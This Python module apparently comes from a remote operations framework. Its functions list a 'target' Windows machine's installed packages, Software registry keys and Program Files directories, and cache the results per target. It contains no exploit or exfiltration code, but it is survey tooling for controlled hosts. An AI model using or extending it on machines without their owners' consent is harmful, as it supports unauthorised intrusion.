
import dsz
import dsz.cmd
import dsz.version
import dsz.script
import ops
import ops.cmd
import ops.db
import ops.project
import ops.files.dirs
import ops.system.registry
import ops.system.environment
import ntpath
from datetime import timedelta, datetime
PACKAGES_TAG = 'OPS_PACKAGES_TAG'
PROGRAM_FILES_32_TAG = 'OPS_32_BIT_PROGRAM_FILES_TAG'
PROGRAM_FILES_64_TAG = 'OPS_64_BIT_PROGRAM_FILES_TAG'
SOFTWARE_32_TAG = 'OPS_32_BIT_SOFTWARE_KEY_TAG'
SOFTWARE_64_TAG = 'OPS_64_BIT_SOFTWARE_KEY_TAG'
MAX_PACKAGES_CACHE_SIZE = 3
MAX_PROGRAMDIR_CACHE_SIZE = 3
MAX_SOFTWARE_KEY_CACHE_SIZE = 3

def get_packagelist(maxage=timedelta(seconds=0), targetID=None, use_volatile=False):
    command = ops.cmd.getDszCommand('packages')
    return ops.project.generic_cache_get(command, cache_tag=PACKAGES_TAG, cache_size=2, maxage=maxage, targetID=targetID, use_volatile=use_volatile)

def get_software_keys(maxage=timedelta(seconds=0), targetID=None, use_volatile=False):
    if (targetID is None):
        targetID = ops.project.getTargetID()
    retval = list()
    if ((dsz.version.Info().major == 5) and (dsz.version.Info().minor == 0)):
        retval.append(ops.system.registry.get_registrykey('L', 'Software', cache_tag=SOFTWARE_32_TAG, cache_size=3, maxage=maxage, targetID=targetID, use_volatile=use_volatile))
    else:
        retval.append(ops.system.registry.get_registrykey('L', 'Software', cache_tag=SOFTWARE_32_TAG, cache_size=3, maxage=maxage, targetID=targetID, use_volatile=use_volatile, wow32=True))
    if (dsz.version.Info().arch == 'x64'):
        retval.append(ops.system.registry.get_registrykey('L', 'Software', cache_tag=SOFTWARE_64_TAG, cache_size=3, maxage=maxage, targetID=targetID, use_volatile=use_volatile, wow64=True))
    return retval

def get_programfiles_dirs(maxage=timedelta(seconds=0), targetID=None, use_volatile=False):
    if (targetID is None):
        targetID = ops.project.getTargetID()
    retval = list()
    progfilespath = ops.system.environment.get_environment_var('PROGRAMFILES', maxage=timedelta(seconds=14400)).value
    if (dsz.version.Info().arch == 'x64'):
        x86path = ops.system.environment.get_environment_var('PROGRAMFILES(x86)', maxage=timedelta(seconds=14400)).value
        retval.append(ops.files.dirs.get_dirlisting(path=x86path, dirsonly=True, cache_tag=PROGRAM_FILES_32_TAG, cache_size=3, maxage=maxage, use_volatile=use_volatile, targetID=targetID))
        retval.append(ops.files.dirs.get_dirlisting(path=progfilespath, dirsonly=True, cache_tag=PROGRAM_FILES_64_TAG, cache_size=3, maxage=maxage, use_volatile=use_volatile, targetID=targetID))
    else:
        retval.append(ops.files.dirs.get_dirlisting(path=progfilespath, dirsonly=True, cache_tag=PROGRAM_FILES_32_TAG, cache_size=3, maxage=maxage, use_volatile=use_volatile, targetID=targetID))
    return retval